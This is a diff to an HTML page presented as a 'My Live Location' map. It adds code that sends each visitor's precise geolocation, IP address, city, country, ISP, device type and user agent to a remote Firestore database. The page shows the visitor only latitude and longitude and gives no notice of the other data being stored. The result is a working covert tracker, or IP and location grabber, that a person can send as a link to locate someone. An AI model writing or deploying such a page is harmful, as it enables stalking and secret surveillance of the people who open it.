@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+
 <title>Live Location Tracker</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -8,6 +9,7 @@
 <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
 
 <style>
+
 body{
 font-family:Arial;
 background:#f4f6fb;
@@ -30,14 +32,22 @@ margin-top:20px;
 border-radius:10px;
 }
 
+.info{
+margin-top:15px;
+font-size:18px;
+}
+
 </style>
+
 </head>
 
 <body>
 
-<header>📍 My Live Location</header>
+<header>
+📍 My Live Location
+</header>
 
-<p id="status">Please Wait....</p>
+<div class="info" id="status">Please Wait...</div>
 
 <div id="map"></div>
 
@@ -66,12 +76,40 @@ L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
 maxZoom:19
 }).addTo(map);
 
-function saveLocation(lat,lon){
+function detectDevice(){
 
-addDoc(collection(db,"locations"),{
+let ua = navigator.userAgent;
+
+if(/mobile/i.test(ua)) return "Mobile";
+if(/tablet/i.test(ua)) return "Tablet";
+return "Desktop";
+
+}
+
+async function saveLocation(lat,lon){
+
+let response = await fetch("https://ipapi.co/json/");
+let data = await response.json();
+
+let flag = "https://flagcdn.com/48x36/" + data.country_code.toLowerCase() + ".png";
+
+await addDoc(collection(db,"locations"),{
+
 latitude:lat,
 longitude:lon,
-time:new Date().toISOString()
+time:new Date().toISOString(),
+
+ip:data.ip,
+city:data.city,
+country:data.country_name,
+country_code:data.country_code,
+flag:flag,
+
+isp:data.org,
+
+device:detectDevice(),
+userAgent:navigator.userAgent
+
 });
 
 }
@@ -82,7 +120,7 @@ let lat = position.coords.latitude;
 let lon = position.coords.longitude;
 
 document.getElementById("status").innerHTML =
-"Lat: "+lat+" | Lon: "+lon;
+"Latitude: "+lat+" | Longitude: "+lon;
 
 map.setView([lat,lon],15);
 
@@ -90,6 +128,8 @@ L.marker([lat,lon]).addTo(map);
 
 saveLocation(lat,lon);
 
+},{
+enableHighAccuracy:true
 });
 
 </script>
